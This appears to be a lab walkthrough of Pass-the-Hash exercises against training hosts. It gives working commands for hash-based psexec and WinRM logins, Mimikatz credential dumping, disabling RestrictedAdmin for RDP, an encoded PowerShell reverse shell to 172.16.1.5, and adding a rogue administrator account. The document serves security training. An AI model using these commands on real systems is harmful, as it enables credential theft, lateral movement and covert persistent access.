## Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

```
impacket-psexec Administrator@10.129.12.138 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
type c:\pth.txt
```


## Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 

xfreerdp3 /v:10.129.12.138 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```


## Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

```
cd c:\tools
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

## Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

![Снимок экрана 2026-01-31 в 23.27.58](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-31%20%D0%B2%2023.27.58.png)

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe"

dir \\dc01\david
type \\dc01\david\david.txt
```

## Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.

![Снимок экрана 2026-01-31 в 23.26.40](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-31%20%D0%B2%2023.26.40.png)

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe"

dir \\DC01\julio
type \\DC01\julio\julio.txt
```

## Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

```
cd c:\tools
.\nc.exe -lvp 4444
```

```
cd c:\tools\Invoke-TheHash
ipconfig
```
![Снимок экрана 2026-01-31 в 23.43.17](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-31%20%D0%B2%2023.43.17.png)

```
https://www.revshells.com
```
![Снимок экрана 2026-01-31 в 23.48.13](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-31%20%D0%B2%2023.48.13.png)

```
. .\Invoke-WMIExec.ps1
Get-Command Invoke-WMIExec

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE3Mi4xNi4xLjUnLCA4MDAxKTskTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7JFN0cmVhbVdyaXRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCROZXR3b3JrU3RyZWFtKTtmdW5jdGlvbiBXcml0ZVRvU3RyZWFtICgkU3RyaW5nKSB7W2J5dGVbXV0kc2NyaXB0OkJ1ZmZlciA9IDAuLiRUQ1BDbGllbnQuUmVjZWl2ZUJ1ZmZlclNpemUgfCAlIHswfTskU3RyZWFtV3JpdGVyLldyaXRlKCRTdHJpbmcgKyAnU0hFTEw+ICcpOyRTdHJlYW1Xcml0ZXIuRmx1c2goKX1Xcml0ZVRvU3RyZWFtICcnO3doaWxlKCgkQnl0ZXNSZWFkID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7JENvbW1hbmQgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJEJ5dGVzUmVhZCAtIDEpOyRPdXRwdXQgPSB0cnkge0ludm9rZS1FeHByZXNzaW9uICRDb21tYW5kIDI+JjEgfCBPdXQtU3RyaW5nfSBjYXRjaCB7JF8gfCBPdXQtU3RyaW5nfVdyaXRlVG9TdHJlYW0gKCRPdXRwdXQpfSRTdHJlYW1Xcml0ZXIuQ2xvc2UoKSI="
```
```
Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

## Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.

```
impacket-psexec john@10.129.12.138 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2

evil-winrm -i 10.129.12.138 -u john -H c4b0e1b10c7ce2c4723b4e2407ef81a2

```
